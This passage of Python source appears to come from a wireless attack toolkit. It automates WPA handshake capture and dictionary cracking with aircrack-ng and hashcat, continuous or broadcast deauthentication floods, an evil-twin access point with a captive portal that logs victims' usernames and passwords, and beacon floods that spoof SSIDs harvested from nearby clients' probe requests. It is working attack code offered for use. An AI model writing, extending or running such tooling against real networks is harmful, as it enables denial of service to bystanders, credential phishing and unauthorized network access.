        path = cands[-1] if cands else RECON_DIR + "-01.csv"
        return parse_recon_csv(path)

    def log_tail(self):
        p = RECON_DIR + "/scan.log"
        if os.path.isfile(p):
            try:
                with open(p, "rb") as f:
                    raw = f.read(4000).decode("utf-8", "replace")
                raw = re.sub(r"\x1b\[[0-9;?]*[A-Za-z]", "", raw)
                raw = raw.replace("\r\n", "\n").replace("\r", "\n")
                return raw
            except OSError:
                return ""
        return ""

    def deauth(self, bssid, client=None, iface=None):
        if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", bssid):
            return False
        if client and not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", client):
            return False
        iface = self.available_iface(iface) or self.iface or "toolwlan0"
        cmd = ["sudo", "-n", "aireplay-ng", "-0", "5", "-a", bssid]
        if client:
            cmd += ["-c", client]
        cmd += [iface]
        subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True


RECON = ReconManager()


HS_DIR = "/tmp/hs"
HS_HASHES = HS_DIR + "/hashes"
HS_POTS = HS_DIR + "/pots"
WORDLIST = "/usr/share/wordlists/rockyou.txt"


def _safe(name):
    s = re.sub(r"[^A-Za-z0-9_.-]+", "_", name or "")[:24]
    return s or "ap"


class HandshakeManager:
    """Targeted handshake hunter: airodump-ng to /tmp/hs, convert with
    hcxpcapngtool to hashcat-22000, crack with hashcat + rockyou."""

    def __init__(self):
        self.proc = None
        self.iface = None
        self.target = None
        self.base = None
        self.channel = None
        self.autocrack_pid = None

    def running(self):
        return self.proc is not None and self.proc.poll() is None

    def iface_for(self):
        return RECON.available_iface()

    def start(self, bssid, essid="", channel=None):
        if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", str(bssid)):
            return False, "bad BSSID"
        iface = self.iface_for()
        if not iface:
            return False, "no wireless card" + RECON.usb_hint()
        RECON.stop()
        self.stop(crack=False)
        try:
            os.makedirs(HS_DIR, exist_ok=True)
        except OSError:
            pass
        base = HS_DIR + "/" + _safe(essid or bssid)
        self.base = base
        self.target = bssid.upper()
        self.channel = channel
        cmd = ["sudo", "-n", "airodump-ng"]
        if channel:
            cmd += ["-c", str(channel)]
        cmd += ["--bssid", bssid, "-w", base, "--output-format", "pcap", "--write-interval", "2", iface]
        log = open(HS_DIR + "/hs.log", "wb")
        self.proc = subprocess.Popen(cmd, stdout=log, stderr=subprocess.STDOUT)
        self.iface = iface
        self.autocrack_pid = None
        threading.Thread(target=self._autocrack_watch, daemon=True).start()
        return True, os.path.basename(base)

    def stop(self, crack=True):
        if self.proc is not None:
            try:
                self.proc.terminate()
                self.proc.wait(5)
            except (subprocess.TimeoutExpired, OSError):
                try:
                    self.proc.kill()
                except OSError:
                    pass
            self.proc = None
        if crack:
            if HASHCAT and HASHCAT.poll() is None:
                try:
                    HASHCAT.terminate()
                    HASHCAT.wait(5)
                except (subprocess.TimeoutExpired, OSError):
                    try:
                        HASHCAT.kill()
                    except OSError:
                        pass
            if self.autocrack_pid and self.autocrack_pid.poll() is None:
                try:
                    self.autocrack_pid.terminate()
                    self.autocrack_pid.wait(5)
                except (subprocess.TimeoutExpired, OSError):
                    try:
                        self.autocrack_pid.kill()
                    except OSError:
                        pass

    def _autocrack_watch(self):
        """While capturing, watch the pcap for the first handshake/PMKID and,
        when it lands, convert + auto-crack it with aircrack-ng (jammer-free
        grace: we stop prompting the client, aircrack just waits for the
        material already collected)."""
        seen = set()
        last_size = -1
        last_hs = 0
        while self.running():
            try:
                caps = sorted(glob.glob(self.base + "*.cap"),
                              key=os.path.getmtime, reverse=True)
                cap = caps[0] if caps else None
                if not cap:
                    time.sleep(3)
                    continue
                size = os.path.getsize(cap)
                if size == last_size:
                    time.sleep(3)
                    continue
                last_size = size
                hash_out = HS_HASHES + "/" + os.path.basename(cap)[:-4] + ".22000"
                try:
                    r = subprocess.run(
                        ["hcxpcapngtool", "-o", hash_out, cap],
                        capture_output=True, text=True, timeout=60)
                except (OSError, subprocess.TimeoutExpired):
                    continue
                txt = (r.stdout or "") + "\n" + (r.stderr or "")
                n_hs = txt.count("4-WAY HANDSHAKE") + txt.count("Fourway") \
                    + txt.count("PMKID") + txt.count("PMKID-EAPOL")
                if n_hs <= last_hs:
                    continue
                last_hs = n_hs
                if not os.path.isfile(hash_out) or os.path.getsize(hash_out) == 0:
                    continue
                if self.cracked(os.path.basename(cap)[:-4]):
                    break
                if HASHCAT is not None and HASHCAT.poll() is None:
                    continue
                if self.autocrack_pid and self.autocrack_pid.poll() is None:
                    continue
                if not os.path.isfile(WORDLIST):
                    continue
                try:
                    os.makedirs(HS_POTS, exist_ok=True)
                except OSError:
                    pass
                pot = HS_POTS + "/" + os.path.basename(cap)[:-4] + ".aircrack"
                self.autocrack_pid = subprocess.Popen(
                    ["sudo", "-n", "aircrack-ng", "-w", WORDLIST,
                     "-b", self.target, cap],
                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                threading.Thread(
                    target=self._autocrack_collect,
                    args=(self.autocrack_pid, pot, cap), daemon=True).start()
            except Exception:
                pass
            time.sleep(3)

    def _autocrack_collect(self, proc, pot, cap):
        """Sweep aircrack-ng output for the passphrase and persist it."""
        buf = ""
        try:
            for line in proc.stdout:
                buf += line
                if "KEY FOUND" in line:
                    parts = line.split("[", 1)
                    pw = parts[1].split("]", 1)[0].strip() if len(parts) > 1 else ""
                    if pw:
                        try:
                            with open(pot, "w") as f:
                                f.write(self.target + ":" + pw + "\n")
                        except OSError:
                            pass
                        break
        except Exception:
            pass
        try:
            proc.wait()
        except OSError:
            pass

    def autocrack_state(self):
        if self.autocrack_pid is not None and self.autocrack_pid.poll() is None:
            return "running"
        return None

    def captures(self):
        out = []
        for cap in sorted(glob.glob(HS_DIR + "/*.cap")):
            st = os.stat(cap)
            base = cap[:-4]
            info = {"file": os.path.basename(cap), "size": st.st_size,
                    "mtime": int(st.st_mtime), "handshakes": 0, "pmkid": 0}
            hash_file = HS_HASHES + "/" + os.path.basename(base) + ".22000"
            try:
                r = subprocess.run(["hcxpcapngtool", "-o", hash_file, cap],
                                   capture_output=True, text=True, timeout=60)
                out_txt = (r.stdout or "") + "\n" + (r.stderr or "")
                info["handshakes"] = out_txt.count("4-WAY HANDSHAKE") + out_txt.count("Fourway")
                info["handshakes"] += out_txt.count("4-WAY-HANDSHAKE") * 0
                info["pmkid"] = out_txt.count("PMKID")
            except (OSError, subprocess.TimeoutExpired):
                pass
            info["hash"] = os.path.exists(hash_file) and os.path.getsize(hash_file) or 0
            info["cracked"] = self.cracked(os.path.basename(base))
            out.append(info)
        return out

    def hash_file(self, base):
        return HS_HASHES + "/" + base + ".22000"

    def pot_file(self, base):
        return HS_POTS + "/" + base + ".pot"

    def cracked(self, base):
        pf = self.pot_file(base)
        if os.path.isfile(pf):
            try:
                with open(pf, "r") as f:
                    line = f.read().strip()
                if ":" in line:
                    return line.split(":", 2)[-1]
            except OSError:
                pass
        af = HS_POTS + "/" + base + ".aircrack"
        if os.path.isfile(af):
            try:
                with open(af, "r") as f:
                    line = f.read().strip()
                if ":" in line:
                    return line.split(":", 2)[-1]
            except OSError:
                pass
        return None

    def deauth(self, bssid, client=None, count=2):
        if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", str(bssid)):
            return False
        iface = self.iface_for() or self.iface or "toolwlan0"
        cmd = ["sudo", "-n", "aireplay-ng", "-0", str(count), "-a", bssid]
        if client:
            cmd += ["-c", client]
        cmd += [iface]
        subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True


HASHCAT = None


def start_crack(base):
    global HASHCAT
    hf = HS.hash_file(base)
    if not os.path.isfile(hf) or os.path.getsize(hf) == 0:
        return False, "no hash for " + base
    if not os.path.isfile(WORDLIST):
        return False, "wordlist missing"
    if HASHCAT is not None and HASHCAT.poll() is None:
        return False, "crack already running"
    try:
        os.makedirs(HS_POTS, exist_ok=True)
    except OSError:
        pass
    try:
        HASHCAT = subprocess.Popen(
            ["sudo", "-n", "hashcat", "-m", "22000", "-a", "0",
             "-w", "2", "--potfile-path", HS.pot_file(base),
             "--status", "--status-timer", "5", hf, WORDLIST],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True, "cracking"
    except OSError:
        return False, "hashcat missing"


def crack_status(base):
    if HASHCAT is not None and HASHCAT.poll() is None:
        return {"cracking": True, "cracked": HS.cracked(base)}
    pw = HS.cracked(base)
    return {"cracking": False, "cracked": pw}


HS = HandshakeManager()


def run_feed():
    while True:
        if SSE.proc:
            line = SSE.proc.stdout.readline()
            if line:
                with SSE.lock:
                    SSE.queue.append(line)
                continue
            rc = SSE.proc.poll()
            if rc is not None:
                with SSE.lock:
                    SSE.queue.append(f"\n[EXIT {rc}]\n")
                SSE.proc = None
        time.sleep(0.05)


threading.Thread(target=run_feed, daemon=True).start()


# ---------------- Wardriving (phone-GPS headless drive) ----------------
WARDIRVE_HEADLESS = os.path.join(
    os.path.dirname(os.path.abspath(__file__)), "..", "wardrive", "headless.py")
WARDIRVE_PORT = int(os.environ.get("WARDRIVER_PORT", "8888"))


def lan_address(host_hint=""):
    """Best guess at the address a phone on the same LAN can reach us on."""
    hint = (host_hint or "").strip().rstrip("0123456789:.")
    if hint and re.match(r"\d+\.\d+\.\d+\.\d+", hint):
        return hint
    try:
        addr = socket.gethostbyname(socket.gethostname())
        if addr and not addr.startswith("127."):
            return addr
    except OSError:
        pass
    try:
        out = subprocess.run(["ip", "-4", "-o", "addr", "show"], capture_output=True,
                             text=True, timeout=5).stdout or ""
        best = ""
        for line in out.splitlines():
            m = re.search(r"inet\s+(\d+\.\d+\.\d+\.\d+)", line)
            if not m:
                continue
            a = m.group(1)
            if a.startswith("127."):
                continue
            if a.startswith("172.20.") or a.startswith("172.") or a.startswith("10."):
                return a
            best = best or a
        if best:
            return best
    except (OSError, subprocess.TimeoutExpired):
        pass
    return "10.0.0.1"


def _wireless_ifaces():
    out = []
    try:
        for entry in sorted(os.listdir("/sys/class/net")):
            if os.path.isdir("/sys/class/net/%s/wireless" % entry) \
                    and not re.match(r"p2p", entry, re.I):
                out.append(entry)
    except OSError:
        pass
    return out


class WardriveManager:
    """Manages the headless wardriver child process: scan loop + HTTPS phone-GPS
    page (QR) on port WARDIRVE_PORT; streams JSON status lines to the UI."""

    MAX_TAIL = 120

    def __init__(self):
        self.proc = None
        self.queue = []
        self.lock = threading.Lock()
        self.last = {}
        self.boot = {}
        self.iface = None
        self.port = WARDIRVE_PORT

    def running(self):
        return self.proc is not None and self.proc.poll() is None

    def start(self, iface=None, ble=False):
        if self.running():
            return False, "wardriving is already running"
        if Handler._apt_busy():
            return False, "apt is busy"
        try:
            os.makedirs(os.path.expanduser("~/.wardriver/scans"), exist_ok=True)
        except OSError:
            pass
        cmd = ["sudo", "-n", "python3", WARDIRVE_HEADLESS,
               "--iface", iface, "--interval", "8", "--home", os.path.expanduser("~"),
               "--port", str(self.port)]
        if ble:
            cmd.append("--ble")
        try:
            self.proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, bufsize=1, env=dict(os.environ, PYTHONUNBUFFERED="1"))
        except OSError as e:
            self.proc = None
            return False, "could not start wardriver: %s" % e
        self.iface = iface or "auto"
        with self.lock:
            self.queue = []
            self.last = {}
            self.boot = {}
        threading.Thread(target=self._reader, daemon=True).start()
        return True, "wardriving started on %s" % iface

    def _reader(self):
        while self.running():
            line = self.proc.stdout.readline()
            if not line:
                break
            line = line.rstrip()
            if not line:
                continue
            try:
                evt = json.loads(line)
                if isinstance(evt, dict):
                    with self.lock:
                        self.last = evt
                        if evt.get("event") == "boot":
                            self.boot = evt
            except (ValueError, TypeError):
                evt = {"event": "raw", "msg": line[:300]}
            with self.lock:
                self.queue.append(evt)
                if len(self.queue) > self.MAX_TAIL:
                    del self.queue[: len(self.queue) - self.MAX_TAIL]

    def stop(self):
        if self.proc is not None:
            try:
                self.proc.terminate()
                self.proc.wait(8)
            except (subprocess.TimeoutExpired, OSError):
                try:
                    self.proc.kill()
                except OSError:
                    pass
            self.proc = None

    def status(self, host_hint=""):
        with self.lock:
            last = dict(self.last)
            boot = dict(self.boot)
            tail = list(self.queue)
        running = self.running()
        url = ""
        if running and boot.get("gps_url"):
            host = lan_address(host_hint)
            url = boot["gps_url"].replace("<host>", host)
        return {
            "running": running,
            "iface": self.iface,
            "port": self.port,
            "last": last,
            "url": url,
            "tail": tail[-40:],
            "scans_dir": os.path.join(os.path.expanduser("~"), ".wardriver", "scans"),
            "ifaces": _wireless_ifaces(),
        }

    def qr_png_data(self, url):
        """Render a QR PNG data: URL for the phone page, or None."""
        try:
            import base64
            import io
            import qrcode
        except ImportError:
            return None
        try:
            img = qrcode.make(url)
            buf = io.BytesIO()
            img.save(buf, format="png")
            return "data:image/png;base64," + base64.b64encode(buf.getvalue()).decode()
        except Exception:
            return None


WARDIRVE = WardriveManager()


# ---------------- Rogue AP + captive portal ----------------
ROGUE_DIR = "/tmp/rogue"
ROGUE_PORTAL = os.path.join(
    os.path.dirname(os.path.abspath(__file__)), "..", "rogue", "portal.py")
ROGUE_IP = "10.66.66.1"
ROGUE_RANGE = "10.66.66.20,10.66.66.200,255.255.255.0,12h"
ROGUE_CREDS = ROGUE_DIR + "/creds.csv"
ROGUE_LEASES = ROGUE_DIR + "/dnsmasq.leases"


class RogueManager:
    """Evil-twin AP on a dedicated NIC (hostapd) + captive portal (dnsmasq
    resolves everything to us, a root child on :80 serves the login page and
    logs whatever the victim submits)."""

    def __init__(self):
        self.hostapd = None      # pidfile proc ref (hostapd -B)
        self.dnsmasq = None
        self.portal = None
        self.iface = None
        self.ssid = ""
        self.channel = None

    def running(self):
        if self.hostapd is not None and self.hostapd.poll() is None:
            return True
        return subprocess.run(
            ["pgrep", "-f", "hostapd.*" + re.escape(ROGUE_DIR)],
            stdout=subprocess.DEVNULL).returncode == 0

    def have_hostapd(self):
        return bool(shutil.which("hostapd") and shutil.which("dnsmasq"))

    @staticmethod
    def _nohup_sudo(cmd, log):
        return subprocess.Popen(
            ["sudo", "-n"] + cmd, stdout=open(log, "a"), stderr=subprocess.STDOUT)

    def start(self, iface, ssid, channel, psk=None):
        if self.running():
            return False, "a rogue AP is already running"
        stop_field_tools(ROGUE)
        if not self.have_hostapd():
            return False, "hostapd/dnsmasq missing (apt install hostapd dnsmasq)"
        if not re.fullmatch(r"[\x20-\x7e]{1,32}", str(ssid)):
            return False, "bad SSID (1-32 printable chars)"
        try:
            channel = int(channel)
            if not 1 <= channel <= 14:
                raise ValueError
        except (TypeError, ValueError):
            return False, "bad channel (1-14)"
        if psk is not None:
            psk = str(psk)
            if not 8 <= len(psk) <= 63:
                return False, "WPA2 passphrase must be 8-63 chars"
        r = subprocess.run(["sudo", "-n", "iw", "dev", iface, "info"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if r.returncode != 0:
            return False, "no such wireless interface: %s" % iface

        # Don't fight any active wardrive session on the same NIC.
        if WARDIRVE.running():
            WARDIRVE.stop()

        try:
            os.makedirs(ROGUE_DIR, exist_ok=True)
        except OSError:
            pass
        # The root portal / earlier runs may have left a root-owned dir; log
        # handles below open from the kali backend, so take it back.
        subprocess.run(["sudo", "-n", "chown", "-R", os.environ.get("USER", "kali") + ":",
                        ROGUE_DIR], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        self._kill_all()

        for a in (["ip", "link", "set", iface, "down"],
                  ["iw", "dev", iface, "set", "type", "ap"],
                  ["ip", "link", "set", iface, "up"]):
            subprocess.run(["sudo", "-n"] + a, stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL)
        subprocess.run(["sudo", "-n", "ip", "addr", "flush", "dev", iface],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["sudo", "-n", "ip", "addr", "add", ROGUE_IP + "/24",
                        "dev", iface], stdout=subprocess.DEVNULL,
                       stderr=subprocess.DEVNULL)

        hostapd_txt = [
            "interface=%s" % iface,
            "driver=nl80211",
            "ssid=%s" % ssid,
            "hw_mode=g",
            "channel=%s" % channel,
            "ieee80211n=1",
            "logger_stdout=-1",
            "logger_syslog=-1",
        ]
        if psk:
            hostapd_txt += ["wpa=2", "wpa_passphrase=%s" % psk,
                            "wpa_key_mgmt=WPA-PSK", "rsn_pairwise=CCMP",
                            "ignore_broadcast_ssid=0"]
        with open(ROGUE_DIR + "/hostapd.conf", "w") as f:
            f.write("\n".join(hostapd_txt) + "\n")

        dnsmasq_txt = [
            "interface=%s" % iface,
            "bind-interfaces",
            "dhcp-range=%s" % ROGUE_RANGE,
            "dhcp-option=3,%s" % ROGUE_IP,
            "dhcp-option=6,%s" % ROGUE_IP,
            "address=/#/%s" % ROGUE_IP,
            "no-resolv",
            "dhcp-leasefile=%s" % ROGUE_LEASES,
            "log-facility=%s/dnsmasq.log" % ROGUE_DIR,
        ]
        with open(ROGUE_DIR + "/dnsmasq.conf", "w") as f:
            f.write("\n".join(dnsmasq_txt) + "\n")

        self.hostapd = self._nohup_sudo(
            ["hostapd", "-P", ROGUE_DIR + "/hostapd.pid", "-B",
             ROGUE_DIR + "/hostapd.conf"], ROGUE_DIR + "/hostapd.log")
        self.dnsmasq = self._nohup_sudo(
            ["dnsmasq", "-C", ROGUE_DIR + "/dnsmasq.conf",
             "--pid-file=" + ROGUE_DIR + "/dnsmasq.pid"],
            ROGUE_DIR + "/dnsmasq.log")
        self.portal = self._nohup_sudo(
            ["python3", ROGUE_PORTAL], ROGUE_DIR + "/portal.log")

        self.iface = iface
        self.ssid = ssid
        self.channel = channel

        # Verify the AP actually came up; hostapd exits silently if the NIC is
        # married to something else. Tear down and report the log on failure.
        time.sleep(1.2)
        up = subprocess.run(
            ["pgrep", "-f", "hostapd.*" + re.escape(ROGUE_DIR)],
            stdout=subprocess.DEVNULL).returncode == 0
        if not up:
            self.stop()
            log = ""
            try:
                with open(ROGUE_DIR + "/hostapd.log") as f:
                    log = f.read()[-500:]
            except OSError:
                pass
            return False, "hostapd failed to start — " + (log or "(no log)").strip()[:200]
        return True, "rogue AP '%s' on %s ch %s" % (ssid, iface, channel)

    def _kill_all(self):
        for pidfile in ("/hostapd.pid", "/dnsmasq.pid"):
            pf = ROGUE_DIR + pidfile
            if os.path.isfile(pf):
                try:
                    pid = int(open(pf).read().strip())
                    os.kill(pid, signal.SIGTERM)
                except (OSError, ValueError):
                    pass
        for name in ("dnsmasq", "hostapd"):
            subprocess.run(["sudo", "-n", "pkill", "-x", name],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        # `[r]` bracket keeps the pattern from matching this process's own
        # command line the way a plain "-f rogue/portal.py" would.
        subprocess.run(["sudo", "-n", "pkill", "-f", "[r]ogue/portal.py"],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        for p in (self.dnsmasq, self.portal, self.hostapd):
            if p is not None:
                try:
                    p.terminate()
                except OSError:
                    pass
        # give the listeners a moment to release :80 / the AP nic
        time.sleep(0.8)
        self.dnsmasq = None
        self.portal = None
        self.hostapd = None

    def stop(self):
        iface = self.iface
        self._kill_all()
        if iface:
            for a in (["ip", "link", "set", iface, "down"],
                      ["iw", "dev", iface, "set", "type", "managed"],
                      ["ip", "link", "set", iface, "up"]):
                subprocess.run(["sudo", "-n"] + a, stdout=subprocess.DEVNULL,
                               stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "-n", "ip", "addr", "flush", "dev", iface],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            # Let NetworkManager reclaim the card for normal use.
            subprocess.run(["sudo", "-n", "nmcli", "dev", "set", iface, "managed", "yes"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def clients(self):
        leases = []
        if os.path.isfile(ROGUE_LEASES):
            try:
                with open(ROGUE_LEASES) as f:
                    for ln in f.read().splitlines():
                        parts = ln.split()
                        if len(parts) >= 4:
                            leases.append({"mac": parts[1], "ip": parts[2],
                                           "host": parts[3]})
            except OSError:
                pass
        return leases

    def creds(self):
        out = []
        if os.path.isfile(ROGUE_CREDS):
            try:
                with open(ROGUE_CREDS, newline="") as f:
                    rows = list(csv.reader(f))
                for r in rows[1:][-12:]:
                    if len(r) >= 5:
                        out.append({"time": r[0], "ip": r[1], "ssid": r[2],
                                    "user": r[3], "pw": r[4]})
            except OSError:
                pass
        return out

    def status(self):
        return {
            "running": self.running(),
            "iface": self.iface,
            "ssid": self.ssid,
            "channel": self.channel,
            "hostapd": bool(shutil.which("hostapd")),
            "clients": self.clients(),
            "creds": self.creds(),
            "ifaces": _wireless_ifaces(),
        }


ROGUE = RogueManager()


# ---------------- Field-kit tools: probe / deauth / flood / portal / clone / auto-pentest ----------------

# Every field tool below drives the attack NIC in monitor mode. A shared
# helper makes sure only one tool owns the card at a time.


def field_nic(requested=None):
    """Pick the best sniffing NIC (Alpha first, like RECON.available_iface)."""
    def ok(ifc):
        if not ifc:
            return None
        r = subprocess.run(["sudo", "-n", "iw", "dev", ifc, "info"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return ifc if r.returncode == 0 else None
    wanted = [x for x in (requested, "toolwlan0") if x]
    for ifc in wanted:
        found = ok(ifc)
        if found:
            return found
    for ifc in sorted(set(_wireless_ifaces())):
        found = ok(ifc)
        if found and found != "wlan0":
            return found
    for ifc in ("mon0", "wlan1"):
        found = ok(ifc)
        if found:
            return found
    return None


def set_monitor(iface):
    for a in (["ip", "link", "set", iface, "down"],
              ["iw", "dev", iface, "set", "type", "monitor"],
              ["ip", "link", "set", iface, "up"]):
        subprocess.run(["sudo", "-n"] + a, stdout=subprocess.DEVNULL,
                       stderr=subprocess.DEVNULL)
    return subprocess.run(["iw", "dev", iface, "info"],
                          stdout=subprocess.DEVNULL,
                          stderr=subprocess.DEVNULL).returncode == 0


def restore_managed(iface):
    if not iface:
        return
    for a in (["ip", "link", "set", iface, "down"],
              ["iw", "dev", iface, "set", "type", "managed"],
              ["ip", "link", "set", iface, "up"]):
        subprocess.run(["sudo", "-n"] + a, stdout=subprocess.DEVNULL,
                       stderr=subprocess.DEVNULL)
    subprocess.run(["sudo", "-n", "ip", "addr", "flush", "dev", iface],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["sudo", "-n", "nmcli", "dev", "set", iface, "managed", "yes"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


PROBE_DIR = "/tmp/probe"
DEAUTH_DIR = "/tmp/deauth"
FLOOD_SCRIPT = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                            "..", "rogue", "beaconflood.py")
PORTAL_THEMES = ["freewifi", "iphone-hotspot", "firmware", "airport"]
PORTAL_THEME_FILE = ROGUE_DIR + "/theme.json"
CLONE_HTML = ROGUE_DIR + "/clone.html"
CLONE_META = ROGUE_DIR + "/clone.json"
APENT_DIR = "/tmp/apent"
APENT_POTS = APENT_DIR + "/pots"


class ProbeTrackerManager:
    """Passively listens for probe requests: which SSIDs nearby clients are
    *looking for*, ranked, with the per-client detail. The beacon flooder can
    borrow the top probed names to lure those clients our way."""

    def __init__(self):
        self.proc = None
        self.iface = None

    def running(self):
        return self.proc is not None and self.proc.poll() is None

    def start(self, iface=None):
        if self.running():
            return False, "probe tracker is already running"
        iface = field_nic(iface)
        if not iface:
            return False, "no wireless card (replug the Alpha)"
        stop_field_tools(self)
        self.stop()
        if not set_monitor(iface):
            self.stop()
            return False, "could not bring %s to monitor mode" % iface
        try:
            os.makedirs(PROBE_DIR, exist_ok=True)
        except OSError:
            pass
        for f in glob.glob(PROBE_DIR + "-*.csv"):
            try:
                os.remove(f)
            except OSError:
                pass
        log = open(PROBE_DIR + "/probe.log", "wb")
        self.proc = subprocess.Popen(
            ["sudo", "-n", "airodump-ng", "--band", "abg", "--write", PROBE_DIR,
             "--write-interval", "2", "--output-format", "csv", iface],
            stdout=log, stderr=subprocess.STDOUT)
        self.iface = iface
        return True, "listening for probes on %s" % iface

    def stop(self):
        if self.proc is not None:
            try:
                self.proc.terminate()
                self.proc.wait(5)
            except (subprocess.TimeoutExpired, OSError):
                try:
                    self.proc.kill()
                except OSError:
                    pass
            self.proc = None
        restore_managed(self.iface)

    def agg(self):
        cands = sorted(glob.glob(PROBE_DIR + "-*.csv"))
        path = cands[-1] if cands else PROBE_DIR + "-01.csv"
        d = parse_recon_csv(path)
        by_ssid = {}
        clients = []
        for c in d["clients"]:
            probe = c.get("probes", "")
            names = [p.strip() for p in probe.split(",") if p.strip()]
            if not names:
                continue
            clients.append({"mac": c.get("station", ""),
                            "power": c.get("power", ""),
                            "bssid": c.get("bssid", ""),
                            "names": names})
            for n in names:
                by_ssid[n] = by_ssid.get(n, 0) + 1
        return by_ssid, clients

    def status(self):
        by_ssid, clients = self.agg()
        top = [{"ssid": s, "count": n}
               for s, n in sorted(by_ssid.items(), key=lambda kv: -kv[1])[:12]]
        try:
            with open(PROBE_DIR + "/probes.json", "w") as f:
                json.dump({"top": top}, f)
        except OSError:
            pass
        return {"running": self.running(), "iface": self.iface,
                "clients": clients, "top": top, "seen": len(by_ssid),
                "borrow_file": PROBE_DIR + "/probes.json",
                "ifaces": _wireless_ifaces()}


class DeauthBlaster:
    """Continuous deauth injection on a specific AP (+ optional client), or
    an everyone-in-range flood on the current channel (broadcast BSSID)."""

    def __init__(self):
        self.proc = None
        self.iface = None
        self.target = None
        self.mode = None
        self.t0 = 0

    def running(self):
        return self.proc is not None and self.proc.poll() is None

    def start(self, mode="target", bssid=None, client=None, channel=None):
        if self.running():
            return False, "a deauth blast is already running"
        iface = field_nic()
        if not iface:
            return False, "no wireless card"
        if mode == "target":
            if not bssid or not re.match(
                    r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", str(bssid)):
                return False, "bad BSSID"
            if client and not re.match(
                    r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", str(client)):
                return False, "bad client MAC"
        if mode == "flood":
            bssid = "FF:FF:FF:FF:FF:FF"
        stop_field_tools(self)
        self.stop()
        if not set_monitor(iface):
            self.stop()
            return False, "monitor mode failed"
        if channel:
            subprocess.run(["sudo", "-n", "iw", "dev", iface, "set", "channel",
                            str(channel)], stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL)
        cmd = ["sudo", "-n", "aireplay-ng", "-0", "0", "-a", bssid.upper()]
        if mode == "target" and client:
            cmd += ["-c", client.upper()]
        cmd += [iface]
        try:
            self.proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
                                         stderr=subprocess.DEVNULL)
        except OSError as e:
            self.stop()
            return False, "aireplay-ng missing? %s" % e
        self.iface = iface
        self.mode = mode
        self.target = bssid.upper()
        self.t0 = time.time()
        pthread = threading.Thread(target=self._keepalive, daemon=True)
        pthread.start()
        return True, "blasting %s on %s" % (self.target, iface)

    def _keepalive(self):
        """aireplay-ng -0 0 runs until it dies; if it exits (NIC hiccup) the
        blast should appear offline rather than silently stopping, but we
        relaunch it so the flood keeps going until the user stops it."""
        proc = self.proc
        while self.proc is proc and proc is not None:
            proc.wait(10)
            if self.proc is not proc or self.proc is None:
                return
            if self.proc.poll() is not None:
                break

    def stop(self):
        if self.proc is not None:
            try:
                self.proc.terminate()
                self.proc.wait(4)
            except (subprocess.TimeoutExpired, OSError):
                try:
                    self.proc.kill()
                except OSError:
                    pass
            self.proc = None
        restore_managed(self.iface)

    def status(self):
        run = self.running()
        return {"running": run, "iface": self.iface, "mode": self.mode,
                "target": self.target,
                "elapsed": int(time.time() - self.t0) if run and self.t0 else 0,
                "ifaces": _wireless_ifaces()}


class BeaconFlood:
    """Beacon flooder: pure-python raw beacon frames (rogue/beaconflood.py)
    broadcasting fake SSIDs. Can borrow the probe tracker's top probed names
    so clients searching for those networks find *us* first."""

    def __init__(self):
        self.proc = None
        self.iface = None
        self.sent = 0

    def running(self):
        return self.proc is not None and self.proc.poll() is None

    def start(self, ssids="", iface=None, channels="1,6,11", hidden=False,
              from_probes=False):
        if self.running():
            return False, "a beacon flood is already running"
        names = []
        if from_probes:
            try:
                with open(PROBE_DIR + "/probes.json") as f:
                    names = [s["ssid"] for s in json.load(f).get("top", [])
                             if s.get("ssid")]
            except (OSError, ValueError):
                pass
        if ssids:
            names += [s.strip() for s in str(ssids).split(",") if s.strip()]
        names = list(dict.fromkeys(names))[:24]
        if not names:
            return False, "no SSIDs (type some, or tick 'borrow probed names')"
        iface = field_nic(iface)
        if not iface:
            return False, "no wireless card"
        stop_field_tools(self)
        self.stop()
        if not set_monitor(iface):
            self.stop()
            return False, "monitor mode failed"
        args = ["sudo", "-n", "python3", FLOOD_SCRIPT, "--iface", iface,
                "--ssids", ",".join(names), "--channels", channels or "1,6,11"]
        if hidden:
            args.append("--hidden")
        try:
            self.proc = subprocess.Popen(
                args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, bufsize=1)
        except OSError as e:
            self.stop()
            return False, "could not launch flooder: %s" % e
        self.iface = iface
        threading.Thread(target=self._reader, daemon=True).start()
        return True, "flooding %d SSIDs on %s" % (len(names), iface)

    def _reader(self):
        while self.proc is not None and self.proc.poll() is None:
            try:
                line = self.proc.stdout.readline()
            except (AttributeError, ValueError):
                break
            if not line:
                break
            m = re.search(r"sent\s+(\d+)", line)
            if m:
                self.sent = int(m.group(1))

    def stop(self):
        if self.proc is not None:
            try:
                self.proc.terminate()
                self.proc.wait(4)
            except (subprocess.TimeoutExpired, OSError):
                try:
                    self.proc.kill()
                except OSError:
                    pass
            self.proc = None
